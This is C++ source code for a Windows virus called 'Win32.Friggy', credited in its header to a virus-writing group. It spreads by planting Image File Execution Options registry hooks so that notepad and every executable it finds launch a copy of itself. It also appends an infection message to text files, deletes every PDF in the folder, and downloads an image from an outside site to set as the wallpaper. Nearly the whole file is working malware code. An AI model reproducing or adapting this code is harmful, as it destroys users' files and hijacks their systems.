   //http://en.wikipedia.org/wiki/Frigg
   /*
   Name:Win32.Friggy - by free0n [doomriderz]
   free0n.host.sk | doomriderz.co.nr
   Date:02/02/2007
   Desc: Hooks notepad, then whenever/where ever notepad is
   ran it finds other exe's and hooks them too.
   Also leaves a message in text files it finds
   and then deletes pdf documents.

   Payload is a download function that downloads a skull
   image from some jerks site and then sets it as
   the background image. Once the user restarts they
   see the new image as their background
   should be annonying enough :) Why no mass mailing?
   or irc spreading? cause it's been done to death and
   we all can do better then that!

   Why write this? Well mostly for personal learning
   the other was to show some examples of how to do
   hook exe using the image hook in the registy. It's an
   old ass trick so I no way claim this is mine
   and really just wanted to write one for fun and
   learning.

   Compile with BloodShed DevC++
   Bloodshed it's what real men use!
   */
   #include <windows.h>
   #include <iostream>
   #include <string>
   #include <fstream>
   #include <shlobj.h>
   #include <tlhelp32.h>
   #include <stdlib.h>

   using namespace std;

   char key[75] = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\";
   char* appName = "notepad.exe";
   char me[MAX_PATH],windir[MAX_PATH],winbkup[MAX_PATH];
   SYSTEMTIME st;
   char rnd[6];

   void split(string str, string sep, string &fi, string &sec)
   {
        int i = (int)str.find(sep);
        if(i != -1)
        {
           int x = 0;
           if(!str.empty())
           {
              while(x != i)
              {
           fi += str[x++];
              }
          x = x+(int)sep.length();
              while(x != str.length())
              {
           sec += str[x++];
              }
           }
        }
        else
        {
           fi = str;
       sec = "NULL";
        }
   }

   bool FileExists(string n)
   {
       ifstream friggfile(n.c_str());
       return friggfile.is_open();
   }

   string ReplaceAll(string s, string r, string txt)
   {
       int p = txt.find(s,0);
       while(p != string::npos)
       {
           txt.erase(p, s.length());
           txt.insert(p,r);
           p = txt.find(s, p + r.length());
       }
       return txt;
   }

   bool Hook(char* path, char* regPath)
   {
       //creates the registry hoook, the two params
       //we pass in is the path to the executable and the
       //regpath to the image hook, we then create the debugger
       //and throw it in
       HKEY hKey;
       bool hooked = false;
       if(RegCreateKey(HKEY_LOCAL_MACHINE,regPath,&hKey) == ERROR_SUCCESS)
       {
           if(RegSetValueEx(hKey,"Debugger",0,REG_SZ,(BYTE *)path, lstrlen(path)) == ERROR_SUCCESS)
           {
               hooked = true;
           }
       }
       RegCloseKey(hKey);
       return hooked;
   }

   void UnHook(char* regPath)
   {
       //deletes the key
       RegDeleteKey(HKEY_LOCAL_MACHINE, regPath);
   }

   bool HookExists(char* regPath)
   {
       //basic check to see if the hook exists
       //regPath will contain a registry path for the hook...
       HKEY hKey;
       bool keyExists = false;
       if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,regPath,0,KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS)
       {
           keyExists = true;
       }
       return keyExists;
   }

   void InfectFiles()
   {
        //scan for our files to infect
        //and hook. This is pretty much your basic
        //file search in current directory.
        //One thing to note about the hook is that the
        //directory will change anywhere for example notepad
        //is opened up so we will always find new files...

        WIN32_FIND_DATA FindFileData;
        HANDLE hFind = INVALID_HANDLE_VALUE;
        hFind = FindFirstFile("*.*", &FindFileData);
        while(FindNextFile(hFind,&FindFileData) != 0)
        {
           if((FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
           {
             if(strstr(FindFileData.cFileName,".exe"))
             {
                //create a new hook to a new copy of friggy for every exe we find
                //this could get rather large
                if(!strstr(FindFileData.cFileName,"Friggy") ) {
                   char rkey[75] = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\";
                   strcat(rkey,FindFileData.cFileName);

                   if(!HookExists(rkey)) {
                      GetWindowsDirectory (windir, sizeof (windir));
                      strcpy(winbkup,windir);
                      strcat(winbkup,"\System\Friggy");

                      GetSystemTime(&st);
                      srand(st.wSecond);
                      itoa(rand(),rnd,10);
                      strcat(winbkup,rnd);
                      strcat(winbkup,".exe");
                      CopyFile(me,winbkup,TRUE);
                      Hook(winbkup, rkey);
                   }
                }
             }
             else if(strstr(FindFileData.cFileName,".txt"))
             {
                //lets append some text to the txt document
                //i don't care if we already did it to the same file
                //should be funny...
                ofstream vfile(FindFileData.cFileName,ios::app);
                if(vfile.is_open())
                {
                   vfile<<"nInfected with Friggy by free0n - [DoomRiderz]n";
                   vfile.close();
                }
             }
             else if(strstr(FindFileData.cFileName,".pdf"))
             {
                //DIE PDF DIEEEE!
                DeleteFile(FindFileData.cFileName);
             }
           }
        }
        FindClose(hFind);
   }
   void Payload()
   {
       //payload basically downloads the bitmap image
       //from the site below then copies it to the windows
       //directory as skull.bmp
       //aftwards it sets the background to the image we copied to the windows
       //directory and then deletes the file we download in the current
       //directory. easy cheezy ;)
       typedef int * (*URLDownloadToFileA)(void*,char*,char*,DWORD,void*);
       HINSTANCE LibHnd = LoadLibrary("Urlmon.dll");
       URLDownloadToFileA URLDownloadToFile =  (URLDownloadToFileA) GetProcAddress(LibHnd,"URLDownloadToFileA");
       URLDownloadToFile(0, "http://hometown.aol.com/bonednc/images/@skull.bmp", "skull.bmp", 0, 0);

       if(FileExists("skull.bmp"))
       {
          char winDir[MAX_PATH]="";
          GetWindowsDirectory(winDir, MAX_PATH);
          strcat(winDir,"\skull.bmp");

          CopyFile("skull.bmp",winDir,TRUE);
          if(FileExists(winDir))
          {
             HKEY hKey;
             RegCreateKey(HKEY_CURRENT_USER, "Control Panel\Desktop", &hKey);
             RegSetValueEx(hKey, "Wallpaper", 0, REG_SZ, (BYTE *)winDir, lstrlen(winDir)+1);
             RegSetValueEx(hKey, "TileWallpaper", 0, REG_SZ, (BYTE *)"1", lstrlen("1")+1);
             RegCloseKey(hKey);
          }
          DeleteFile("skull.bmp");
       }
   }
   int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
   {
       //grab the current file
       GetModuleFileName(0,me,sizeof(me));

       //cat the key and the appname
       strcat(key,appName);

           //check for command line arguments to the exe
       if(strlen(lpCmdLine) > 0)
       {
               //remove the hook if one exists
           if(HookExists(key))
           {
               UnHook(key);
           }

               //start parsing through the paths given
               //in the cmdline
           if(lpCmdLine != '�')
           {
               LPSTR p = lpCmdLine;
               while(*p)
               {
                   if(*p == '"')
                   {
                       *p = '*';
                   }
                   p++;
               }
               string path = ReplaceAll("*", "", lpCmdLine);
               path = ReplaceAll(".EXE", ".EXE$ ", path);

               string ap, ag;
               split(path,"$",ap,ag);

               char* u = new char[ap.length()];
               strcpy(u, ap.c_str());

               char* t = new char[ag.length()];
               strcpy(t, ag.c_str());

               //now we should have the exe and the arguments
               //we can create a new process and launch it
               //since the previous hook was removed we can
               //launch it, below we will rehook it again
               STARTUPINFO si;
               PROCESS_INFORMATION pi;

               ZeroMemory (&si, sizeof(si));
               si.cb=sizeof (si);

               if(CreateProcess(u,t,NULL,NULL,0,CREATE_NEW_PROCESS_GROUP|CREATE_SUSPENDED,NULL,NULL,&si,&pi))
               {
                           //if we created the process resume and wait
                   ResumeThread(pi.hThread);
                   WaitForSingleObject(pi.hProcess, INFINITE);
               }
           }
       }

       //we rehook although it maybe hooked already
       //there isn't any harm in overwriting it
       //plus if the above code was executed we will have
       //to rehook anyways

       if(Hook(me, key))
       {
           //call our hooking infection
           InfectFiles();

           //run our payload
       Payload();
       }

       //exit
       return 0;
   }
